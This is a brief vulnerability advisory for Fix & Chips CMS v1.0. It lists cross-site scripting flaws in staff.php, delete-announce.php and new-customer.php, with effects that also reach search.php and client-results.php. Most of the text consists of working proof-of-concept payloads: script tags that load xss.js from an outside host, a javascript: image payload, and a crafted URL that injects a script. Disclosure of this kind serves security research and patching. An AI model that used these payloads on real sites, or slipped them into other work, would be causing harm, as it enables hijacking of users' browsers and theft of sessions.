Fix & Chips CMS v1.0

http://software.fixnchipsit.com/

Vulnerable files:

staff.php
delete-announce.php
new-customer.php
search.php
client-results.php
--------------------------------------------

staff.php XSS
User input in the Announcement box isn't properly sanatized before being generated.

A few PoC's that work:

<SCRIPT SRC=http://somesite.com/xss.js></SCRIPT>

<IMG SRC=javascript:alert(&quot;XSS&quot;)>

----------------------------------------------

delete-announce.php XSS

http://www.example.com/delete-announce.php?id=<SCRIPT%20SRC=example.com/xss.js></SCRIPT>

-------------------------------------------------
new-customer.php

User input in all of the input boxes when adding a new customer isnt sanatized. For a PoC in any input box when adding a new 

client put:

<SCRIPT SRC=http://example.com/xss.js></SCRIPT>

Because of the above, all malicious user input that is listed on the pages search.php and client-results.php will execute as well.
